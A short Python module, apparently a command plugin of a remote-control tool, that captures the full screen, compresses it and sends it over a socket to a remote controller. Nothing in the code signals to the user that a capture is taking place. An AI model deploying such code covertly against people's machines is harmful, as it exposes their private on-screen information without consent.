import typing, io, zlib
from PIL import ImageGrab

if typing.TYPE_CHECKING:
    from ..handler import ClientWrapper

def run(socketInstance: 'ClientWrapper') -> None:
    try:
        screenshot = ImageGrab.grab()

    except OSError:
        socketInstance.send_packet('screenshot_response not_available')
        return

    screenshot.save(img := io.BytesIO(), format = 'PNG')
    data = zlib.compress(img.getvalue())

    socketInstance.send_packet(b'screenshot_response ' + data)
